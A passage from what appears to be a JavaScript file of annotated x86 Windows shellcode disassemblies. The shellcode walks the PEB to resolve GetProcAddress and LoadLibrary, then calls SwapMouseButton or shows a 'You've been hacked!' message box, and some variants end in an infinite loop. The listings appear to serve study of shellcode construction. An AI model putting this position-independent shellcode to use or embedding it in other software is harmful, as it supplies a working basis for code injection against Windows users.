    24: 8b 7a 24             mov    edi,DWORD PTR [edx+0x24]        // EDI = RVA of Ordinal Table = Address of Export Table + offset 0x24
    25: 01 df                   add    edi,ebx                                            // EDI = Address of Ordinal Table = base address + RVA of Ordinal Table
    26: 66 8b 0c 4f         mov    cx,WORD PTR [edi+ecx*2]            // CX = Number of Function = Address of Ordinal Table + Counter * 2
    27: 49                       dec    ecx                                                  // Decrement ECX (As name ordinals starts from 0)
    28: 8b 7a 1c             mov    edi,DWORD PTR [edx+0x1c]        // EDI = Offset address table
    29: 01 df                   add    edi,ebx                                           // EDI = Offset address table
    30: 8b 3c 8f              mov    edi,DWORD PTR [edi+ecx*4]       // EDI = Pointer(Offset)
    31: 01 df                   add    edi,ebx                                           // EDI = getProcAddress

Section 4: Use LoadLibrary to load user32.dll

    32: 31 c9                       xor    ecx,ecx                         // ECX = 0
    33: 51                            push   ecx                             // Push ECX onto stack
    34: 68 61 72 79 41        push   0x41797261               //
    35: 68 4c 69 62 72        push   0x7262694c               // AyrarbiLdaoL
    36: 68 4c 6f 61 64         push   0x64616f4c                //
    37: 54                            push   esp                            // "LoadLibraryA"
    38: 53                            push   ebx                            // "Kernel32.dll"
    39: ff d7                         call   edi                               // GetProcAddress(Kernel32.dll,LoadLibraryA)

    getUser32:
    40: 68 6c 6c 61 61              push   0x61616c6c                                    // aall
    41: 66 81 6c 24 02 61 61    sub    WORD PTR [esp+0x2],0x6161       // Remove additional characters "aa"
    42: 68 33 32 2e 64              push   0x642e3233                                   // d.32
    43: 68 55 73 65 72              push   0x72657355                                   // resU
    44: 54                                  push   esp                                                 // User32.dll
    45: ff d0                               call   eax                                                   // Call LoadLibrary(User32.dll)

Section 5: Get SwapMouseButton function address

    46: 68 74 6f 6e 61           push   0x616e6f74						// anot
    47: 83 6c 24 03 61          sub    DWORD PTR [esp+0x3],0x61			// Remove "a"
    48: 68 65 42 75 74          push   0x74754265						// tuBe
    49: 68 4d 6f 75 73           push   0x73756f4d						// suoM
    50: 68 53 77 61 70          push   0x70617753						// pawS
    51: 54                              push   esp								// "SwapMouseButton"
    52: 50                              push   eax								// user32.dll address
    53: ff d7                           call   edi								// GetProcAddress(User32.dll, SwapMouseButton)

Section 6: Call SwapMouseButton

    54: 83 c4 14            add    esp,0x14							// Clean stack
    55: 33 c9                 xor    ecx,ecx							// ECX = 0
    56: 41                      inc    ecx								// ECX = 1
    57: 51                      push   ecx								// Set to true
    58: ff d0                   call   eax								// Swap`;

var SwapMouseButtonOffDisasNSE =
`Section 1: Find kernel32.dll base address

    0: 31 c0                        xor    eax,eax                                           // EAX = 0
    1: 64 8b 60 08              mov    esp,DWORD PTR fs:[eax+0x8]    // Move Segment:Offset(base) to ESP
    2: 8d 2c 24                   lea    ebp,[esp]                                         // Load effective address specified by ESP to EBP (Creates virtual stack)
    3: 31 c0                        xor    eax,eax                                           // EAX = 0
    4: 64 8b 58 30              mov    ebx,DWORD PTR fs:[eax+0x30]  // EBX = PEB(Process Environment Block) // Using offset fs:0x30(Segment:offset)
    5: 8b 5b 0c                   mov    ebx,DWORD PTR [ebx+0xc]        // EBX = PEB_LDR_DATA // Using offset 0xc
    6: 8b 5b 14                   mov    ebx,DWORD PTR [ebx+0x14]     // EBX = LDR->InMemoryOrderModuleList // Using offset 0x14 (First list entry)
    7: 8b 1b                        mov    ebx,DWORD PTR [ebx]               // EBX = Second list entry (ntdll.dll)
    8: 8b 1b                        mov    ebx,DWORD PTR [ebx]               // EBX = Third list entry (kernel32.dll)
    9: 8b 5b 10                   mov    ebx,DWORD PTR [ebx+0x10]     // EBX = Base address of kernel32.dll // Using offset 0x10

Section 2: Get address of GetProcAddress

    10: 8b 53 3c                mov    edx,DWORD PTR [ebx+0x3c]     // EDX = Relative Virtual Memory (RVA) of the PE signature (base address + 0x3c)
    11: 03 d3                     add    edx,ebx                                        // EDX = Address of PE signature = base address + RVA of PE signature
    12: 8b 52 78                mov    edx,DWORD PTR [edx+0x78]    // EDX = RVA of Export Table = Address of PE + offset 0x78
    13: 03 d3                     add    edx,ebx                                        // EDX = Address of Export Table = base address + RVA of export table
    14: 8b 72 20                mov    esi,DWORD PTR [edx+0x20]     // ESI = RVA of Name Pointer Table = Address of Export Table + 0x20
    15: 03 f3                      add    esi,ebx                                         // ESI = Address of Name Pointer Table = base address + RVA of Name Pointer Table
    16: 33 c9                     xor    ecx,ecx                                         // ECX = 0

    loopSearch:
    17: 41                               inc    ecx                                                            // Increment counter ECX
    18: ad                               lods   eax,DWORD PTR ds:[esi]                       // Load next list entry into EAX
    19: 01 d8                          add    eax,ebx                                                   // EAX = Address of Entry = base address + Address of Entry
    20: 81 38 47 65 74 50      cmp    DWORD PTR [eax],0x50746547           // Compare first byte to GetP
    21: 75 f4                            jne    0x2d                                                        // Start over if not equal
    22: 81 78 04 72 6f 63 41  cmp    DWORD PTR [eax+0x4],0x41636f72    // Compare second byte to rocA
    23: 75 eb                           jne    0x2d                                                        // Start over if not equal

    getProcAddressFunc:
    24: 8b 7a 24             mov    edi,DWORD PTR [edx+0x24]        // EDI = RVA of Ordinal Table = Address of Export Table + offset 0x24
    25: 01 df                   add    edi,ebx                                            // EDI = Address of Ordinal Table = base address + RVA of Ordinal Table
    26: 66 8b 0c 4f         mov    cx,WORD PTR [edi+ecx*2]            // CX = Number of Function = Address of Ordinal Table + Counter * 2
    27: 49                       dec    ecx                                                  // Decrement ECX (As name ordinals starts from 0)
    28: 8b 7a 1c             mov    edi,DWORD PTR [edx+0x1c]        // EDI = Offset address table
    29: 01 df                   add    edi,ebx                                           // EDI = Offset address table
    30: 8b 3c 8f              mov    edi,DWORD PTR [edi+ecx*4]       // EDI = Pointer(Offset)
    31: 01 df                   add    edi,ebx                                           // EDI = getProcAddress

Section 4: Use LoadLibrary to load user32.dll

    32: 31 c9                       xor    ecx,ecx                         // ECX = 0
    33: 51                            push   ecx                             // Push ECX onto stack
    34: 68 61 72 79 41        push   0x41797261               //
    35: 68 4c 69 62 72        push   0x7262694c               // AyrarbiLdaoL
    36: 68 4c 6f 61 64         push   0x64616f4c                //
    37: 54                            push   esp                            // "LoadLibraryA"
    38: 53                            push   ebx                            // "Kernel32.dll"
    39: ff d7                         call   edi                               // GetProcAddress(Kernel32.dll,LoadLibraryA)

    getUser32:
    40: 68 6c 6c 61 61              push   0x61616c6c                                    // aall
    41: 66 81 6c 24 02 61 61    sub    WORD PTR [esp+0x2],0x6161       // Remove additional characters "aa"
    42: 68 33 32 2e 64              push   0x642e3233                                   // d.32
    43: 68 55 73 65 72              push   0x72657355                                   // resU
    44: 54                                  push   esp                                                 // User32.dll
    45: ff d0                               call   eax                                                   // Call LoadLibrary(User32.dll)

Section 5: Get SwapMouseButton function address

    46: 68 74 6f 6e 61           push   0x616e6f74						// anot
    47: 83 6c 24 03 61          sub    DWORD PTR [esp+0x3],0x61			// Remove "a"
    48: 68 65 42 75 74          push   0x74754265						// tuBe
    49: 68 4d 6f 75 73           push   0x73756f4d						// suoM
    50: 68 53 77 61 70          push   0x70617753						// pawS
    51: 54                              push   esp								// "SwapMouseButton"
    52: 50                              push   eax								// user32.dll address
    53: ff d7                           call   edi								// GetProcAddress(User32.dll, SwapMouseButton)

Section 6: Call SwapMouseButton

    54: 83 c4 14            add    esp,0x14							// Clean stack
    55: 33 c9                 xor    ecx,ecx							// ECX = 0
    57: 51                      push   ecx								// Set to false
    58: ff d0                   call   eax								// Swap`;

var SwapMouseButtonOnDisasHalt =
`Section 1: Find kernel32.dll base address

    0: 31 c0                        xor    eax,eax                                           // EAX = 0
    1: 64 8b 60 08              mov    esp,DWORD PTR fs:[eax+0x8]    // Move Segment:Offset(base) to ESP
    2: 8d 2c 24                   lea    ebp,[esp]                                         // Load effective address specified by ESP to EBP (Creates virtual stack)
    3: 31 c0                        xor    eax,eax                                           // EAX = 0
    4: 64 8b 58 30              mov    ebx,DWORD PTR fs:[eax+0x30]  // EBX = PEB(Process Environment Block) // Using offset fs:0x30(Segment:offset)
    5: 8b 5b 0c                   mov    ebx,DWORD PTR [ebx+0xc]        // EBX = PEB_LDR_DATA // Using offset 0xc
    6: 8b 5b 14                   mov    ebx,DWORD PTR [ebx+0x14]     // EBX = LDR->InMemoryOrderModuleList // Using offset 0x14 (First list entry)
    7: 8b 1b                        mov    ebx,DWORD PTR [ebx]               // EBX = Second list entry (ntdll.dll)
    8: 8b 1b                        mov    ebx,DWORD PTR [ebx]               // EBX = Third list entry (kernel32.dll)
    9: 8b 5b 10                   mov    ebx,DWORD PTR [ebx+0x10]     // EBX = Base address of kernel32.dll // Using offset 0x10

Section 2: Get address of GetProcAddress

    10: 8b 53 3c                mov    edx,DWORD PTR [ebx+0x3c]     // EDX = Relative Virtual Memory (RVA) of the PE signature (base address + 0x3c)
    11: 03 d3                     add    edx,ebx                                        // EDX = Address of PE signature = base address + RVA of PE signature
    12: 8b 52 78                mov    edx,DWORD PTR [edx+0x78]    // EDX = RVA of Export Table = Address of PE + offset 0x78
    13: 03 d3                     add    edx,ebx                                        // EDX = Address of Export Table = base address + RVA of export table
    14: 8b 72 20                mov    esi,DWORD PTR [edx+0x20]     // ESI = RVA of Name Pointer Table = Address of Export Table + 0x20
    15: 03 f3                      add    esi,ebx                                         // ESI = Address of Name Pointer Table = base address + RVA of Name Pointer Table
    16: 33 c9                     xor    ecx,ecx                                         // ECX = 0

    loopSearch:
    17: 41                               inc    ecx                                                            // Increment counter ECX
    18: ad                               lods   eax,DWORD PTR ds:[esi]                       // Load next list entry into EAX
    19: 01 d8                          add    eax,ebx                                                   // EAX = Address of Entry = base address + Address of Entry
    20: 81 38 47 65 74 50      cmp    DWORD PTR [eax],0x50746547           // Compare first byte to GetP
    21: 75 f4                            jne    0x2d                                                        // Start over if not equal
    22: 81 78 04 72 6f 63 41  cmp    DWORD PTR [eax+0x4],0x41636f72    // Compare second byte to rocA
    23: 75 eb                           jne    0x2d                                                        // Start over if not equal

    getProcAddressFunc:
    24: 8b 7a 24             mov    edi,DWORD PTR [edx+0x24]        // EDI = RVA of Ordinal Table = Address of Export Table + offset 0x24
    25: 01 df                   add    edi,ebx                                            // EDI = Address of Ordinal Table = base address + RVA of Ordinal Table
    26: 66 8b 0c 4f         mov    cx,WORD PTR [edi+ecx*2]            // CX = Number of Function = Address of Ordinal Table + Counter * 2
    27: 49                       dec    ecx                                                  // Decrement ECX (As name ordinals starts from 0)
    28: 8b 7a 1c             mov    edi,DWORD PTR [edx+0x1c]        // EDI = Offset address table
    29: 01 df                   add    edi,ebx                                           // EDI = Offset address table
    30: 8b 3c 8f              mov    edi,DWORD PTR [edi+ecx*4]       // EDI = Pointer(Offset)
    31: 01 df                   add    edi,ebx                                           // EDI = getProcAddress

Section 4: Use LoadLibrary to load user32.dll

    32: 31 c9                       xor    ecx,ecx                         // ECX = 0
    33: 51                            push   ecx                             // Push ECX onto stack
    34: 68 61 72 79 41        push   0x41797261               //
    35: 68 4c 69 62 72        push   0x7262694c               // AyrarbiLdaoL
    36: 68 4c 6f 61 64         push   0x64616f4c                //
    37: 54                            push   esp                            // "LoadLibraryA"
    38: 53                            push   ebx                            // "Kernel32.dll"
    39: ff d7                         call   edi                               // GetProcAddress(Kernel32.dll,LoadLibraryA)

    getUser32:
    40: 68 6c 6c 61 61              push   0x61616c6c                                    // aall
    41: 66 81 6c 24 02 61 61    sub    WORD PTR [esp+0x2],0x6161       // Remove additional characters "aa"
    42: 68 33 32 2e 64              push   0x642e3233                                   // d.32
    43: 68 55 73 65 72              push   0x72657355                                   // resU
    44: 54                                  push   esp                                                 // User32.dll
    45: ff d0                               call   eax                                                   // Call LoadLibrary(User32.dll)

Section 5: Get SwapMouseButton function address

    46: 68 74 6f 6e 61           push   0x616e6f74						// anot
    47: 83 6c 24 03 61          sub    DWORD PTR [esp+0x3],0x61			// Remove "a"
    48: 68 65 42 75 74          push   0x74754265						// tuBe
    49: 68 4d 6f 75 73           push   0x73756f4d						// suoM
    50: 68 53 77 61 70          push   0x70617753						// pawS
    51: 54                              push   esp								// "SwapMouseButton"
    52: 50                              push   eax								// user32.dll address
    53: ff d7                           call   edi								// GetProcAddress(User32.dll, SwapMouseButton)

Section 6: Call SwapMouseButton

    54: 83 c4 14            add    esp,0x14							// Clean stack
    55: 33 c9                 xor    ecx,ecx							// ECX = 0
    56: 41                      inc    ecx								// ECX = 1
    57: 51                      push   ecx								// Set to true
    58: ff d0                   call   eax								// Swap
    59: e9 fb ff ff ff         jmp    0x61fccd                                                    // Jump to this line (Effectively entering an infinite loop)`;

var SwapMouseButtonOffDisasHalt =
`Section 1: Find kernel32.dll base address

    0: 31 c0                        xor    eax,eax                                           // EAX = 0
    1: 64 8b 60 08              mov    esp,DWORD PTR fs:[eax+0x8]    // Move Segment:Offset(base) to ESP
    2: 8d 2c 24                   lea    ebp,[esp]                                         // Load effective address specified by ESP to EBP (Creates virtual stack)
    3: 31 c0                        xor    eax,eax                                           // EAX = 0
    4: 64 8b 58 30              mov    ebx,DWORD PTR fs:[eax+0x30]  // EBX = PEB(Process Environment Block) // Using offset fs:0x30(Segment:offset)
    5: 8b 5b 0c                   mov    ebx,DWORD PTR [ebx+0xc]        // EBX = PEB_LDR_DATA // Using offset 0xc
    6: 8b 5b 14                   mov    ebx,DWORD PTR [ebx+0x14]     // EBX = LDR->InMemoryOrderModuleList // Using offset 0x14 (First list entry)
    7: 8b 1b                        mov    ebx,DWORD PTR [ebx]               // EBX = Second list entry (ntdll.dll)
    8: 8b 1b                        mov    ebx,DWORD PTR [ebx]               // EBX = Third list entry (kernel32.dll)
    9: 8b 5b 10                   mov    ebx,DWORD PTR [ebx+0x10]     // EBX = Base address of kernel32.dll // Using offset 0x10

Section 2: Get address of GetProcAddress

    10: 8b 53 3c                mov    edx,DWORD PTR [ebx+0x3c]     // EDX = Relative Virtual Memory (RVA) of the PE signature (base address + 0x3c)
    11: 03 d3                     add    edx,ebx                                        // EDX = Address of PE signature = base address + RVA of PE signature
    12: 8b 52 78                mov    edx,DWORD PTR [edx+0x78]    // EDX = RVA of Export Table = Address of PE + offset 0x78
    13: 03 d3                     add    edx,ebx                                        // EDX = Address of Export Table = base address + RVA of export table
    14: 8b 72 20                mov    esi,DWORD PTR [edx+0x20]     // ESI = RVA of Name Pointer Table = Address of Export Table + 0x20
    15: 03 f3                      add    esi,ebx                                         // ESI = Address of Name Pointer Table = base address + RVA of Name Pointer Table
    16: 33 c9                     xor    ecx,ecx                                         // ECX = 0

    loopSearch:
    17: 41                               inc    ecx                                                            // Increment counter ECX
    18: ad                               lods   eax,DWORD PTR ds:[esi]                       // Load next list entry into EAX
    19: 01 d8                          add    eax,ebx                                                   // EAX = Address of Entry = base address + Address of Entry
    20: 81 38 47 65 74 50      cmp    DWORD PTR [eax],0x50746547           // Compare first byte to GetP
    21: 75 f4                            jne    0x2d                                                        // Start over if not equal
    22: 81 78 04 72 6f 63 41  cmp    DWORD PTR [eax+0x4],0x41636f72    // Compare second byte to rocA
    23: 75 eb                           jne    0x2d                                                        // Start over if not equal

    getProcAddressFunc:
    24: 8b 7a 24             mov    edi,DWORD PTR [edx+0x24]        // EDI = RVA of Ordinal Table = Address of Export Table + offset 0x24
    25: 01 df                   add    edi,ebx                                            // EDI = Address of Ordinal Table = base address + RVA of Ordinal Table
    26: 66 8b 0c 4f         mov    cx,WORD PTR [edi+ecx*2]            // CX = Number of Function = Address of Ordinal Table + Counter * 2
    27: 49                       dec    ecx                                                  // Decrement ECX (As name ordinals starts from 0)
    28: 8b 7a 1c             mov    edi,DWORD PTR [edx+0x1c]        // EDI = Offset address table
    29: 01 df                   add    edi,ebx                                           // EDI = Offset address table
    30: 8b 3c 8f              mov    edi,DWORD PTR [edi+ecx*4]       // EDI = Pointer(Offset)
    31: 01 df                   add    edi,ebx                                           // EDI = getProcAddress

Section 4: Use LoadLibrary to load user32.dll

    32: 31 c9                       xor    ecx,ecx                         // ECX = 0
    33: 51                            push   ecx                             // Push ECX onto stack
    34: 68 61 72 79 41        push   0x41797261               //
    35: 68 4c 69 62 72        push   0x7262694c               // AyrarbiLdaoL
    36: 68 4c 6f 61 64         push   0x64616f4c                //
    37: 54                            push   esp                            // "LoadLibraryA"
    38: 53                            push   ebx                            // "Kernel32.dll"
    39: ff d7                         call   edi                               // GetProcAddress(Kernel32.dll,LoadLibraryA)

    getUser32:
    40: 68 6c 6c 61 61              push   0x61616c6c                                    // aall
    41: 66 81 6c 24 02 61 61    sub    WORD PTR [esp+0x2],0x6161       // Remove additional characters "aa"
    42: 68 33 32 2e 64              push   0x642e3233                                   // d.32
    43: 68 55 73 65 72              push   0x72657355                                   // resU
    44: 54                                  push   esp                                                 // User32.dll
    45: ff d0                               call   eax                                                   // Call LoadLibrary(User32.dll)

Section 5: Get SwapMouseButton function address

    46: 68 74 6f 6e 61           push   0x616e6f74						// anot
    47: 83 6c 24 03 61          sub    DWORD PTR [esp+0x3],0x61			// Remove "a"
    48: 68 65 42 75 74          push   0x74754265						// tuBe
    49: 68 4d 6f 75 73           push   0x73756f4d						// suoM
    50: 68 53 77 61 70          push   0x70617753						// pawS
    51: 54                              push   esp								// "SwapMouseButton"
    52: 50                              push   eax								// user32.dll address
    53: ff d7                           call   edi								// GetProcAddress(User32.dll, SwapMouseButton)

Section 6: Call SwapMouseButton

    54: 83 c4 14            add    esp,0x14							// Clean stack
    55: 33 c9                 xor    ecx,ecx							// ECX = 0
    57: 51                      push   ecx								// Set to false
    58: ff d0                   call   eax								// Swap
    59: e9 fb ff ff ff         jmp    0x61fccd                                                    // Jump to this line (Effectively entering an infinite loop)`;

// -----------------------------------------------------------------------------------------------------------------------------------------------------------------------

var MsgBoxADisas = 
`Section 1: Set up a new stack frame

		0:  31 c0                     xor    eax,eax				    // Set eax to zero
		1:  64 8b 60 08          mov    esp, fs:[eax+0x8]		    // Move Segment:Offset(base) to esp
		2:  8d 2c 24                lea    ebp,[esp]				    // Load effective address specified by esp to ebp (Creates virtual stack)

Section 2: Find kernel32.dll base address

		3:  31 c0                  xor    eax,eax						// EAX = 0
		4:  64 8b 58 30        mov    ebx, fs:[eax+0x30]			// EBX = PEB(Process Environment Block) // Using offset fs:0x30 (Segment:offset)
		5:  8b 5b 0c             mov    ebx, [ebx+0xc]				// EBX = PEB_LDR_DATA // using offset 0xc
		6: 8b 5b 14              mov    ebx, [ebx+0x14]				// EBX = LDR->InMemoryOrderModuleList // using offset 0x14 (First list entry)
		7: 8b 1b                   mov    ebx, [ebx]					// EBX = second list entry (ntdll.dll) // in InMemoryOrderModuleList (offset 0x00)
		8: 8b 1b                   mov    ebx, [ebx]					// EBX = third list entry (kernel32.dll) // in InMemoryOrderModuleList (offset 0x00)
		9: 8b 5b 10              mov    ebx, [ebx+0x10]				// EBX = base address of kernel32.dll // using offset 0x10 from EBX

Section 3: Get address of GetProcAddress

		10: 8b 53 3c              mov    edx, [ebx+0x3c]				// EDX = Relative Virtual Memory (RVA) of the PE signature (base address + 0x3c)
		11: 01 da                   add    edx,ebx					// EDX = Address of PE signature = base address + RVA of PE signature
		12: 8b 52 78              mov    edx, [edx+0x78]				// EDX = RVA of Export Table = Address of PE + offset 0x78
		13: 01 da                   add    edx,ebx					// EDX = Address of Export Table = base address + RVA of export table
		14: 8b 72 20              mov    esi, [edx+0x20]				// ESI = RVA of Name Pointer Table = Address of Export Table + 0x20
		15: 01 de                   add    esi,ebx					        // ESI = Address of Name Pointer Table = base address + RVA of Name Pointer Table
		16: 31 c9                    xor    ecx,ecx				        // ECX = 0

	loopSearch:
		17: 41                                inc    ecx						        // Increment Counter
		18: ad                                lods   eax,DWORD PTR ds:[esi]		        // Load next entry in list into EAX
		19: 01 d8                           add    eax,ebx						// EAX = Address of entry = base address + Address of Entry
		20: 81 38 47 65 74 50       cmp    dword [eax],0x50746547			// Compare first byte to GetP
		21: 75 f4                             jne    loopSearch					        // Start over if not equal
		22: 81 78 04 72 6f 63 41   cmp    dword [eax+0x4],0x41636f72             // Compare second byte to rocA
		23: 75 eb                            jne    loopSearch					        // Start over if not equal

	getProcAddressFunc:
		24: 8b 7a 24                mov    edi, [edx+0x24] 				// EDI = RVA of Ordinal Table = Address of Export Table + offset 0x24
		25: 01 df                      add    edi,ebx						// EDI = Address of Ordinal Table = base address + RVA of Ordinal Table
		26: 66 8b 0c 4f            mov    cx, [edi+ecx*2]					// CX = Number of Function = Address of Ordinal Table + Counter * 2
		27: 49                          dec    ecx							// Decrement ECX (As name ordinals starts from 0)
		28: 8b 7a 1c                mov    edi,DWORD PTR [edx+0x1c]		// EDI = RVA of AddressOfFunctions
		29: 01 df                      add    edi,ebx						// EDI = AddressOfFunctions
		30: 8b 3c 8f                 mov    edi,DWORD PTR [edi+ecx*4]	        // EDI = Pointer to required function (ECX * 4 because each pointer has 4 bytes)
		31: 01 df                      add    edi,ebx					        // EDI = getProcAddress = base address + Pointer to required function

Section 4: Use LoadLibrary to load user32.dll

	getLoadLibraryA:
		32: 31 c9                          xor    ecx,ecx			// ECX = 0
		33: 51                              push   ecx		        // Push ECX onto stack
		34: 68 61 72 79 41          push   0x41797261		//
		35: 68 4c 69 62 72          push   0x7262694c		// AyrarbiLdaoL
		36: 68 4c 6f 61 64           push   0x64616f4c  		//
		37: 54                              push   esp		        // "LoadLibraryA"
		38: 53                              push   ebx			// "Kernel32.dll"
		39: ff d7                           call   edi			        // GetProcAddress(Kernel32.dll,LoadLibraryA)

	getUser32:
		40: 68 6c 6c 61 61              push   0x61616c6c			            // aall
		41: 66 81 6c 24 02 61 61    sub    WORD PTR [esp+0x2],0x6161	    // Remove additional characters "aa"
		42: 68 33 32 2e 64              push   0x642e3233   		                    // d.32
		43: 68 55 73 65 72              push   0x72657355			            // resU
		44: 54                                  push   esp						    // "User32.dll"
		45: ff d0                               call   eax						    // Call LoadLibrary(User32.dll)

Section 5: Use GetProcAddress to find the address of MessageBox

	getMessageBox:
		46: 68 6f 78 41 61           push   0x6141786f					// aAxo
		47: 66 83 6c 24 03 61     sub    WORD PTR [esp+0x3],0x61		// Remove additional character "a"
		48: 68 61 67 65 42          push   0x42656761					// Bega
		49: 68 4d 65 73 73          push   0x7373654d					// sseM
		50: 54                              push   esp					        // "MessageBoxA"
		51: 50                              push   eax						// "User.dll"
		52: ff d7                           call   edi						        // GetProcAddress(User32.dll,MessageBoxA)

Section 6: Specify the function parameters

	MessageBoxA:
	    53: 83 c4 10                add    esp,0x10				// Clean the stack
	    54: 31 d2                     xor    edx,edx					// EDX = 0
            55: 52                          push   edx					// Push NULL
            56: 68 6c 6f 69 74       push   0x74696f6c				// ...
            57: 68 20 45 78 70      push   0x70784520				// ...
            58: 68 6f 78 20 2d       push   0x2d20786f				// ...
            59: 68 4d 73 67 42      push   0x4267734d				// "MsgBox - Exploit"
            60: 89 e6                     mov    esi,esp					// ESI = Title
            61: 52                          push   edx					// Push terminating byte
            62: 68 6b 65 64 21      push   0x2164656b				// ...
            63: 68 20 68 61 63      push   0x63616820				// ...
            64: 68 62 65 65 6e      push   0x6e656562				// ...
            65: 68 27 76 65 20      push   0x20657627				// ...
            66: 68 20 59 6f 75       push   0x756f5920				// "You've been hacked!"
            67: 89 e1                     mov    ecx,esp					// ECX = Message

Section 7: Call the function

		68: 6a 11                 push   0x11				// Push Type (MB_OKCANCEL|MB_ICONWARNING)
		69: 56                      push   esi					// Push Title
		70: 51                      push   ecx				// Push Message
		71: 52                      push   edx				// Push NULL for windowhandle
		72: ff d0                   call   eax			    		// MessageBoxA(windowhandle,msg,title,type)

Section 8: Exit Safely

		 73: 68 65 73 73 61           push   0x61737365                              // asse
		 74: 66 83 6c 24 03 61      sub    WORD PTR [esp+0x3],0x61      // Remove the "a"
		 75: 68 50 72 6f 63            push   0x636f7250                               // corP
		 76: 68 45 78 69 74           push   0x74697845                              // tixE
		 77: 54                               push   esp                                            // "ExitProcess"
		 78: 53                               push   ebx                                            // "Kernel32.dll"
		 79: ff d7                            call   edi                                                // GetProcAddress(Kernel32.dll, ExitProcess)
		 80: 31 c9                          xor    ecx,ecx                                        // ECX = 0
		 81: 51                               push   ecx                                             // Push 0
		 82: ff d0                            call   eax                                               // ExitProcess(0)`;

var MsgBoxANPDisas = 
`Section 1: Set up a new stack frame

        0:  31 c0                     xor    eax,eax				    // Set eax to zero
        1:  64 8b 60 08          mov    esp, fs:[eax+0x8]		    // Move Segment:Offset(base) to esp
        2:  8d 2c 24                lea    ebp,[esp]				    // Load effective address specified by esp to ebp (Creates virtual stack)

Section 2: Find kernel32.dll base address

        3:  31 c0                  xor    eax,eax						// EAX = 0
        4:  64 8b 58 30        mov    ebx, fs:[eax+0x30]			// EBX = PEB(Process Environment Block) // Using offset fs:0x30 (Segment:offset)
        5:  8b 5b 0c             mov    ebx, [ebx+0xc]				// EBX = PEB_LDR_DATA // using offset 0xc
        6: 8b 5b 14              mov    ebx, [ebx+0x14]				// EBX = LDR->InMemoryOrderModuleList // using offset 0x14 (First list entry)
        7: 8b 1b                   mov    ebx, [ebx]					// EBX = second list entry (ntdll.dll) // in InMemoryOrderModuleList (offset 0x00)
        8: 8b 1b                   mov    ebx, [ebx]					// EBX = third list entry (kernel32.dll) // in InMemoryOrderModuleList (offset 0x00)
        9: 8b 5b 10              mov    ebx, [ebx+0x10]				// EBX = base address of kernel32.dll // using offset 0x10 from EBX

Section 3: Get address of GetProcAddress

        10: 8b 53 3c              mov    edx, [ebx+0x3c]				// EDX = Relative Virtual Memory (RVA) of the PE signature (base address + 0x3c)
        11: 01 da                   add    edx,ebx					// EDX = Address of PE signature = base address + RVA of PE signature
        12: 8b 52 78              mov    edx, [edx+0x78]				// EDX = RVA of Export Table = Address of PE + offset 0x78
        13: 01 da                   add    edx,ebx					// EDX = Address of Export Table = base address + RVA of export table
        14: 8b 72 20              mov    esi, [edx+0x20]				// ESI = RVA of Name Pointer Table = Address of Export Table + 0x20
        15: 01 de                   add    esi,ebx					        // ESI = Address of Name Pointer Table = base address + RVA of Name Pointer Table
        16: 31 c9                    xor    ecx,ecx				        // ECX = 0

    loopSearch:
        17: 41                                inc    ecx						        // Increment Counter
        18: ad                                lods   eax,DWORD PTR ds:[esi]		        // Load next entry in list into EAX
        19: 01 d8                           add    eax,ebx						// EAX = Address of entry = base address + Address of Entry
        20: 81 38 47 65 74 50       cmp    dword [eax],0x50746547			// Compare first byte to GetP
        21: 75 f4                             jne    loopSearch					        // Start over if not equal
        22: 81 78 04 72 6f 63 41   cmp    dword [eax+0x4],0x41636f72             // Compare second byte to rocA
        23: 75 eb                            jne    loopSearch					        // Start over if not equal

    getProcAddressFunc:
        24: 8b 7a 24                mov    edi, [edx+0x24] 				// EDI = RVA of Ordinal Table = Address of Export Table + offset 0x24
        25: 01 df                      add    edi,ebx						// EDI = Address of Ordinal Table = base address + RVA of Ordinal Table
        26: 66 8b 0c 4f            mov    cx, [edi+ecx*2]					// CX = Number of Function = Address of Ordinal Table + Counter * 2
        27: 49                          dec    ecx							// Decrement ECX (As name ordinals starts from 0)
        28: 8b 7a 1c                mov    edi,DWORD PTR [edx+0x1c]		// EDI = RVA of AddressOfFunctions
        29: 01 df                      add    edi,ebx						// EDI = AddressOfFunctions
        30: 8b 3c 8f                 mov    edi,DWORD PTR [edi+ecx*4]	        // EDI = Pointer to required function (ECX * 4 because each pointer has 4 bytes)
        31: 01 df                      add    edi,ebx					        // EDI = getProcAddress = base address + Pointer to required function

Section 4: Use LoadLibrary to load user32.dll

    getLoadLibraryA:
        32: 31 c9                          xor    ecx,ecx			// ECX = 0
        33: 51                              push   ecx		        // Push ECX onto stack
        34: 68 61 72 79 41          push   0x41797261		//
        35: 68 4c 69 62 72          push   0x7262694c		// AyrarbiLdaoL
        36: 68 4c 6f 61 64           push   0x64616f4c  		//
        37: 54                              push   esp		        // "LoadLibraryA"
        38: 53                              push   ebx			// "Kernel32.dll"
        39: ff d7                           call   edi			        // GetProcAddress(Kernel32.dll,LoadLibraryA)

    getUser32:
        40: 68 6c 6c 61 61              push   0x61616c6c			            // aall
        41: 66 81 6c 24 02 61 61    sub    WORD PTR [esp+0x2],0x6161	    // Remove additional characters "aa"
        42: 68 33 32 2e 64              push   0x642e3233   		                    // d.32
        43: 68 55 73 65 72              push   0x72657355			            // resU
        44: 54                                  push   esp						    // "User32.dll"
        45: ff d0                               call   eax						    // Call LoadLibrary(User32.dll)

Section 5: Use GetProcAddress to find the address of MessageBox

    getMessageBox:
        46: 68 6f 78 41 61           push   0x6141786f					// aAxo
        47: 66 83 6c 24 03 61     sub    WORD PTR [esp+0x3],0x61		// Remove additional character "a"
        48: 68 61 67 65 42          push   0x42656761					// Bega
        49: 68 4d 65 73 73          push   0x7373654d					// sseM
        50: 54                              push   esp					        // "MessageBoxA"
        51: 50                              push   eax						// "User.dll"
        52: ff d7                           call   edi						        // GetProcAddress(User32.dll,MessageBoxA)

Section 6: Call the function

        53: 52                      push   edx				// Push NULL for windowhandle
        54: 52                      push   edx				// Push NULL for windowhandle
        55: 52                      push   edx				// Push NULL for windowhandle
        56: 52                      push   edx				// Push NULL for windowhandle
        57: ff d0                   call   eax			    		// MessageBoxA(windowhandle,msg,title,type)

Section 7: Exit Safely

        58: 68 65 73 73 61           push   0x61737365                              // asse
        59: 66 83 6c 24 03 61      sub    WORD PTR [esp+0x3],0x61      // Remove the "a"
        60: 68 50 72 6f 63            push   0x636f7250                               // corP
        61: 68 45 78 69 74           push   0x74697845                              // tixE
        62: 54                               push   esp                                            // "ExitProcess"
        63: 53                               push   ebx                                            // "Kernel32.dll"
        64: ff d7                            call   edi                                                // GetProcAddress(Kernel32.dll, ExitProcess)
        65: 31 c9                          xor    ecx,ecx                                        // ECX = 0
        66: 51                               push   ecx                                             // Push 0
